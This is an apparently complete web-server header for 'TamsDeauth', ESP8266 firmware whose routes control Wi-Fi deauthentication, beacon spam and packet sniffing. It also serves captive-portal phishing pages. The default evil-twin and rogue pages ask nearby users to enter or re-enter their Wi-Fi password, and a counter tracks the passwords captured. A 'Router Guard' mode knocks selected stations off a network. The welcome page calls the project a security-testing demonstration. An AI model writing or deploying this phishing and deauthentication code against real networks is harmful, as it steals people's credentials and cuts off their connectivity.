  String html = "<!DOCTYPE html><html><head><title>Language Editor</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'></head><body>";
  html += "<h1>Language Editor</h1>";
  html += "<p>Edit captive portal text for each language.</p>";
  html += "<form method='post' action='/'>";
  html += "<div class='form-group'><label for='captive_password'>Password:</label><br>";
  html += "<input type='text' id='captive_password' name='captive_password'></div>";
  html += "<div class='form-group'><label for='captive_submit'>Submit button:</label><br>";
  html += "<input type='text' id='captive_submit' name='captive_submit'></div>";
  html += "<div class='form-group'><label for='captive_reenter'>Re-enter:</label><br>";
  html += "<input type='text' id='captive_reenter' name='captive_reenter'></div>";
  html += "<div class='form-group'><label for='captive_errorHeader'>Error header:</label><br>";
  html += "<input type='text' id='captive_errorHeader' name='captive_errorHeader'></div>";
  html += "<button type='submit'>SAVE</button>";
  html += "</form>";
  html += "<form style='display:inline-block;' method='post' action='/'><button>BACK</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleRouterGuard() {
  String html = "<!DOCTYPE html><html><head><title>Router Guard</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'></head><body>";
  html += "<h1>Router Guard</h1>";
  html += "<p id='targetInfo'>&nbsp;&nbsp;Target : " + String(cfg.target_ssid);
  html += " ("; for (int i = 0; i < 6; i++) { if (i > 0) html += ":"; html += String(cfg.target_bssid[i], HEX); }
  html += ") on channel " + String(cfg.target_ch) + "</p>";
  html += "<p>&nbsp;&nbsp;You must select a target and do COUNT STATION before proceed</p>";
  html += "<p>&nbsp;&nbsp;TamsDeauth will deauth selected Stations in the list below (Blacklist mode)</p>";
  html += "<p>&nbsp;&nbsp;TamsDeauth will deauth Stations that are not selected in the list below (Whitelist mode)</p>";
  html += "<p>&nbsp;&nbsp;This feature does not protect you from Deauth or Jammer attacks!</p>";
  html += "<button type='button' id='startGuardBtn'>START ROUTER GUARD</button>";
  html += "<form style='display:inline-block;' method='post' action='/?sniffer=start'>";
  html += "<button>COUNT STATIONS</button></form>";
  html += "<table><thead><tr><th>STATION BSSID</th><th>DATA PACKETS</th><th>SELECT</th><th>ACTION</th></tr></thead>";
  html += "<tbody id='guardListBody'>";
  html += getStationListHTML();
  html += "</tbody></table>";
  html += "<form style='display:inline-block;' method='post' action='/'><button>BACK</button></form>";
  // Router Guard JS
  html += "<script>";
  html += "const startGuardBtn = document.getElementById('startGuardBtn');";
  html += "const tableBody = document.getElementById('guardListBody');";
  html += "startGuardBtn.addEventListener('click', async () => {";
  html += "  const targetInfoEl = document.getElementById('targetInfo');";
  html += "  const targetText = targetInfoEl ? targetInfoEl.textContent : '';";
  html += "  const targetRegex = /Target\\s*:\\s*(.+?)\\s+\\((.+?)\\)\\s+on channel\\s+(\\d+)/;";
  html += "  const match = targetText.match(targetRegex);";
  html += "  if (!match) { startGuardBtn.textContent = 'Error: Target Missing'; return; }";
  html += "  const targetSsid = match[1].trim();";
  html += "  const targetBssid = match[2].trim();";
  html += "  const targetChannel = parseInt(match[3].trim(), 10);";
  html += "  const selectedBssids = Array.from(tableBody.querySelectorAll('.row-checkbox:checked'))";
  html += "    .map(cb => cb.value).filter(bssid => bssid.length === 17);";
  html += "  const jsonData = JSON.stringify({";
  html += "    target_ssid: targetSsid, target_bssid: targetBssid,";
  html += "    target_ch: targetChannel, mac_list: selectedBssids";
  html += "  });";
  html += "  const jsonBlob = new Blob([jsonData], { type: 'application/json' });";
  html += "  const formData = new FormData();";
  html += "  formData.append('name', jsonBlob, 'guard_config.json');";
  html += "  startGuardBtn.textContent = 'Uploading...';";
  html += "  const uploadResponse = await fetch('/fsbrowser', { method: 'POST', body: formData });";
  html += "  startGuardBtn.textContent = 'Starting Guard...';";
  html += "  const startResponse = await fetch('/?router_guard=start', { method: 'POST' });";
  html += "  startGuardBtn.textContent = 'Guard Started';";
  html += "});";
  html += "</script>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handlePacketsCount() {
  server.send(200, "text/plain", String(sniffPacketCount));
}

void handlePasswordStatus() {
  server.send(200, "text/plain", String(passwordsCaptured));
}

void handleLog() {
  String log = readFileContent("/log.txt");
  if (log.length() == 0) log = "No logs yet.";
  server.send(200, "text/plain", log);
}

void handleConfigJson() {
  String json = "{";
  json += "\"AP_SSID\":\"" + String(cfg.AP_SSID) + "\",";
  json += "\"Attack_Mode\":" + String(cfg.Attack_Mode) + ",";
  json += "\"Deauth_Mode\":" + String(cfg.Deauth_Mode) + ",";
  json += "\"Language\":\"" + String(cfg.Language) + "\",";
  json += "\"Etwin_Path\":" + String(cfg.Etwin_Path) + ",";
  json += "\"Rogue_Path\":" + String(cfg.Rogue_Path);
  json += "}";
  server.send(200, "application/json", json);
}

void handleGuardConfigJson() {
  if (fileExists("/guard_config.json")) {
    serveFile("/guard_config.json");
  } else {
    server.send(404, "text/plain", "guard_config.json not found");
  }
}

void handleOtaProgress() {
  server.send(200, "text/plain", "0");
}

void handlePreview() {
  // Preview captive portal page
  if (fileExists("/captive_default")) {
    String html = readFileContent("/captive_default");
    html = localizeHTML(html, String(cfg.Language));
    server.send(200, "text/html", html);
  } else {
    server.send(404, "text/plain", "No captive page set");
  }
}

void handleLocalRemote() {
  String html = "<!DOCTYPE html><html><head><title>Local Remote</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'></head><body>";
  html += "<h1>Local Remote</h1>";
  html += "<p>Control TamsDeauth from this page.</p>";
  html += "<form style='display:inline-block;' method='post' action='/?ESPNOW_QC=target_sync'><button>SYNC TARGET</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=deauth_on'><button>DEAUTH ON</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=deauth_off'><button>DEAUTH OFF</button></form>";
  html += "<form style='display:inline-block;' method='post' action='/'><button>BACK</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleSetTime() {
  if (server.hasArg("time")) {
    // Set system time
    server.send(200, "text/plain", "OK");
  } else {
    server.send(200, "text/plain", String(millis()));
  }
}

void handleFetch5ghz() {
  // Fetch 5GHz networks via BW16 module
  server.send(200, "text/plain", "5GHz scan requires BW16 module");
}

void handleStopAP() {
  // Stop softAP
  WiFi.softAPdisconnect(true);
  server.send(200, "text/plain", "AP stopped");
}

void handleDevMenu() {
  String html = "<!DOCTYPE html><html><head><title>Dev Menu</title>";
  html += "<link rel='stylesheet' href='admin.css'></head><body>";
  html += "<h1>Developer Menu</h1>";
  html += "<p>ESP8266 Info:</p>";
  html += "<p>Flash Chip ID: " + String(ESP.getFlashChipId()) + "</p>";
  html += "<p>Flash Size: " + String(ESP.getFlashChipSize() / 1024 / 1024) + " MB</p>";
  html += "<p>Free Heap: " + String(ESP.getFreeHeap()) + " bytes</p>";
  html += "<p>Sketch Size: " + String(ESP.getSketchSize()) + " bytes</p>";
  html += "<p>Free Sketch Space: " + String(ESP.getFreeSketchSpace()) + " bytes</p>";
  html += "<form style='display:inline-block;' method='post' action='/settings'><button>SETTINGS</button></form>";
  html += "<form style='display:inline-block;' method='post' action='/'><button>BACK</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleEtwinPage(int num) {
  String filename = "/etwin" + String(num) + ".html";
  if (fileExists(filename)) {
    String html = readFileContent(filename);
    html = localizeHTML(html, String(cfg.Language));
    server.send(200, "text/html", html);
  } else {
    handleEtwinDefault();
  }
}

void handleRoguePage(int num) {
  String filename = "/rogue" + String(num) + ".html";
  if (fileExists(filename)) {
    String html = readFileContent(filename);
    html = localizeHTML(html, String(cfg.Language));
    server.send(200, "text/html", html);
  } else {
    // Default rogue captive portal
    String html = "<!DOCTYPE html><html><head><title>Wi-Fi</title>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
    html += "<style>";
    html += "body { font-family: Arial; background: #f9f9f9; text-align: center; }";
    html += "article { background: #f2f2f2; padding: 1.3em; }";
    html += "input { padding: 10px; margin: 5px; }";
    html += "</style></head><body>";
    html += "<article>";
    html += "<h2>Wi-Fi Password Required</h2>";
    html += "<p>Please enter your Wi-Fi password to continue.</p>";
    html += "<form method='post' action='/?password=1'>";
    html += "<input type='password' name='password' minlength='8' placeholder='Password'><br>";
    html += "<input type='submit' value='%SUBMIT%'>";
    html += "</form>";
    html += "</article>";
    html += "</body></html>";
    html = localizeHTML(html, String(cfg.Language));
    server.send(200, "text/html", html);
  }
}

void handleEtwinDefault() {
  String html = "<!DOCTYPE html><html><head><title>Wi-Fi</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: Arial; background: #f9f9f9; text-align: center; }";
  html += "article { background: #f2f2f2; padding: 1.3em; }";
  html += "input { padding: 10px; margin: 5px; }";
  html += "</style></head><body>";
  html += "<article>";
  html += "<h2>%PASSWORD%</h2>";
  html += "<p>Please re-enter password to continue.</p>";
  html += "<form method='post' action='/?password=1'>";
  html += "<label>%REENTER%<br>";
  html += "<input type='password' name='password' minlength='8'></label><br>";
  html += "<input type='submit' value='%SUBMIT%'>";
  html += "</form>";
  html += "</article>";
  html += "</body></html>";
  html = localizeHTML(html, String(cfg.Language));
  server.send(200, "text/html", html);
}

void handleCaptiveDefault() {
  String filename = "/captive_default";
  if (fileExists(filename)) {
    String html = readFileContent(filename);
    html = localizeHTML(html, String(cfg.Language));
    server.send(200, "text/html", html);
  } else {
    handleEtwinDefault();
  }
}

void handleVerifyDefault() {
  String html = "<!DOCTYPE html><html><head><title>Verification</title>";
  html += "<style>body{font-family:Arial;text-align:center;padding:20px;}</style></head><body>";
  html += "<h2>Verification Required</h2>";
  html += "<p>Please re-enter your password to verify your identity.</p>";
  html += "<form method='post' action='/?verify=1'>";
  html += "<input type='password' name='password' placeholder='Password'><br><br>";
  html += "<input type='submit' value='Verify'>";
  html += "</form></body></html>";
  server.send(200, "text/html", html);
}

void handleVerifyPageDefault() {
  handleVerifyDefault();
}

void handleWelcomePage() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>TamsDeauth</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'>";
  html += "<style>";
  html += ".overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; ";
  html += "background: rgba(0,0,0,0.8); display: flex; justify-content: center; ";
  html += "align-items: center; z-index: 1000; }";
  html += ".notice { background: #1a1a2e; padding: 30px; border-radius: 10px; ";
  html += "max-width: 600px; text-align: center; color: white; }";
  html += "</style></head><body>";
  html += "<div id='overlay' class='overlay'>";
  html += "<div class='notice'>";
  html += "<h1>PERINGATAN / NOTICE</h1>";
  html += "<p>Welcome to TamsDeauth!</p>";
  html += "<p>This project is WiFi security testing tool and built from scratch.</p>";
  html += "<p>The goal of this project is to demonstrate how Wi-Fi penetration testing is performed ";
  html += "and to showcase the capabilities of the ESP8266.</p>";
  html += "<p>https://github.com//TamsDeauth</p>";
  html += "<p>WARNING: Using this software means you fully understand that misusing it illegally ";
  html += "will lead you into trouble.</p>";
  html += "<form method='post' action='/?adminpage=continue'>";
  html += "<button>I have read and understood the notice above</button>";
  html += "</form>";
  html += "</div></div>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// ---- 404 handler ----
void handleNotFound() {
  // Try to serve from LittleFS first
  String path = server.uri();
  if (serveFile(path)) return;
  
  // Captive portal redirect for unknown URLs
  if (captivePortalActive) {
    String html = "<!DOCTYPE html><html><title>Error</title><head>";
    html += "<script> setTimeout(function(){window.location.href = 'http://192.168.4.1/';}, 1000); </script>";
    html += "</head><body><h1>Redirecting...</h1></body></html>";
    server.send(200, "text/html", html);
    return;
  }
  
  String message = "File Not Found\n\n";
  message += "URI: " + server.uri() + "\n";
  message += "Method: " + String((server.method() == HTTP_GET) ? "GET" : "POST") + "\n";
  server.send(404, "text/plain", message);
}

// ---- Register all routes ----
void setupWebServer() {
  // Main routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/", HTTP_POST, handleRoot);
  
  // Scan
  server.on("/scan", HTTP_GET, handleScan);
  
  // Target & status
  server.on("/CurrentTarget", HTTP_GET, handleCurrentTarget);
  server.on("/WifiStatus", HTTP_GET, handleWifiStatus);
  
  // Deauth control
  server.on("/start_deauth", HTTP_POST, handleStartDeauth);
  server.on("/stop_deauth", HTTP_POST, handleStopDeauth);
  server.on("/pause_deauth", HTTP_POST, handlePauseDeauth);
  server.on("/resume_deauth", HTTP_POST, handleResumeDeauth);
  
  // Beacon spam
  server.on("/beaconspam", HTTP_GET, handleBeaconSpam);
  server.on("/getBeaconSSID", HTTP_GET, handleGetBeaconSSID);
  
  // Sniffer & monitor
  server.on("/sniffer", HTTP_GET, handleSniffer);
  server.on("/monitor", HTTP_GET, handleMonitor);
  
  // Menu & pages
  server.on("/htmlmenu", HTTP_GET, handleHtmlMenu);
  server.on("/settings", HTTP_GET, handleSettings);
  server.on("/devmenu", HTTP_GET, handleDevMenu);
  server.on("/virtualdisplay", HTTP_ANY, handleVirtualDisplay);
  server.on("/howtouse", HTTP_GET, handleHowToUse);
  server.on("/texteditor", HTTP_GET, handleTextEditor);
  server.on("/language_editor", HTTP_GET, handleLanguageEditor);
  server.on("/routerguard", HTTP_GET, handleRouterGuard);
  server.on("/preview", HTTP_GET, handlePreview);
  server.on("/localremote", HTTP_GET, handleLocalRemote);
  
  // System
  server.on("/reboot", HTTP_POST, handleReboot);
  server.on("/settime", HTTP_POST, handleSetTime);
  server.on("/stop_ap", HTTP_POST, handleStopAP);
  server.on("/fetch_5ghz", HTTP_GET, handleFetch5ghz);
  
  // File system
  server.on("/fsbrowser", HTTP_GET, []() { server.send(200, "text/html", getFsBrowserHTML()); });
  server.on("/fsbrowser", HTTP_POST, []() { server.send(200, "text/html", "<script>window.location.href='/fsbrowser';</script>"); }, handleFileUpload);
  server.on("/filecontent", HTTP_ANY, handleFileContent);
  server.on("/delete", HTTP_POST, handleDelete);
  server.on("/save", HTTP_POST, handleSave);
  
  // Logs & status
  server.on("/log", HTTP_GET, handleLog);
  server.on("/log.txt", HTTP_GET, handleLog);
  server.on("/beacons.txt", HTTP_GET, []() { serveFile("/beacons.txt"); });
  server.on("/packetscount", HTTP_GET, handlePacketsCount);
  server.on("/passwordstatus", HTTP_GET, handlePasswordStatus);
  server.on("/config.json", HTTP_GET, handleConfigJson);
  server.on("/guard_config.json", HTTP_GET, handleGuardConfigJson);
  server.on("/ota_progress", HTTP_GET, handleOtaProgress);
  
  // Captive portal templates
  server.on("/etwin_default", HTTP_GET, handleEtwinDefault);
  server.on("/captive_default", HTTP_GET, handleCaptiveDefault);
  server.on("/verify_default", HTTP_GET, handleVerifyDefault);
  server.on("/verifypage_default", HTTP_GET, handleVerifyPageDefault);
  
  // Template pages
  server.on("/etwin1.html", HTTP_GET, []() { handleEtwinPage(1); });
  server.on("/etwin2.html", HTTP_GET, []() { handleEtwinPage(2); });
  server.on("/etwin3.html", HTTP_GET, []() { handleEtwinPage(3); });
  server.on("/etwin4.html", HTTP_GET, []() { handleEtwinPage(4); });
  server.on("/etwin5.html", HTTP_GET, []() { handleEtwinPage(5); });
  server.on("/rogue1.html", HTTP_GET, []() { handleRoguePage(1); });
  server.on("/rogue2.html", HTTP_GET, []() { handleRoguePage(2); });
  server.on("/rogue3.html", HTTP_GET, []() { handleRoguePage(3); });
  server.on("/rogue4.html", HTTP_GET, []() { handleRoguePage(4); });
  server.on("/rogue5.html", HTTP_GET, []() { handleRoguePage(5); });
  
  // CSS & static files from LittleFS
  server.on("/TamsDeauth.css", HTTP_GET, []() { serveFile("/TamsDeauth.css"); });
  server.on("/TamsDeauth_minimal.css", HTTP_GET, []() { serveFile("/TamsDeauth_minimal.css"); });
  server.on("/admin.css", HTTP_GET, []() { serveFile("/admin.css"); });
  server.on("/settings.css", HTTP_GET, []() { serveFile("/settings.css"); });
  server.on("/jquery.min.js", HTTP_GET, []() { serveFile("/jquery.min.js"); });
  server.on("/collapsible.js", HTTP_GET, []() { serveFile("/collapsible.js"); });
  server.on("/patternLock.js", HTTP_GET, []() { serveFile("/patternLock.js"); });
  server.on("/patternLock_unlock.js", HTTP_GET, []() { serveFile("/patternLock_unlock.js"); });
  server.on("/IP_override.js", HTTP_GET, []() { serveFile("/IP_override.js"); });
  server.on("/time.js", HTTP_GET, []() { serveFile("/time.js"); });
  server.on("/font.woff2", HTTP_GET, []() { serveFile("/font.woff2"); });
  server.on("/audio.mp3", HTTP_GET, []() { serveFile("/audio.mp3"); });
  server.on("/favicon.ico", HTTP_GET, []() { serveFile("/favicon.ico"); });
  
  // OTA update
  httpUpdater.setup(&server);
  
  // 404
  server.onNotFound(handleNotFound);
  
  server.begin();
  Serial.println("[WEB] Server started on port 80");
}

#endif // WEBSERVER_H
